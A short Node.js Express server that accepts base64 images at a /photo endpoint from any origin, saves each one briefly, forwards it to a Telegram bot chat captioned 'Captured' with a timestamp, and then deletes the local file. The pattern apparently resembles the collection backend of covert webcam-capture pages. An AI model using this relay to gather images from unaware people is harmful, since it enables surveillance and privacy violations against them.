const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
app.use(cors());
app.use(express.json({ limit: "60mb" }));

const TELE_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELE_CHAT = process.env.TELEGRAM_CHAT_ID;

if (!TELE_TOKEN || !TELE_CHAT) {
  console.warn("Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in env.");
}

app.post("/photo", async (req, res) => {
  try {
    if (!req.body || !req.body.image) return res.status(400).send("No image");

    // decode and save
    const base64 = req.body.image.split(",")[1];
    const filename = `photo_${Date.now()}.png`;
    const filepath = path.join(__dirname, filename);
    fs.writeFileSync(filepath, base64, "base64");

    console.log("Saved local:", filename);

    // send to Telegram if token present
    if (TELE_TOKEN && TELE_CHAT) {
      try {
        const form = new FormData();
        form.append("chat_id", TELE_CHAT);
        form.append("photo", fs.createReadStream(filepath));
        // optional caption:
        form.append("caption", `Captured: ${new Date().toISOString()}`);

        const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`;
        const resp = await axios.post(url, form, { headers: form.getHeaders() });
        console.log("Telegram response:", resp.data && resp.data.ok);
      } catch (err) {
        console.error("Telegram send error:", err?.response?.data || err.message);
      }
    }

    // remove local file (optional)
    fs.unlinkSync(filepath);

    res.send({ saved: true, filename });
  } catch (err) {
    console.error("Server error:", err);
    res.status(500).send("error");
  }
});

const port = process.env.PORT || 5000;
app.listen(port, "0.0.0.0", () => {
  console.log(`Server listening on port ${port}`);
});
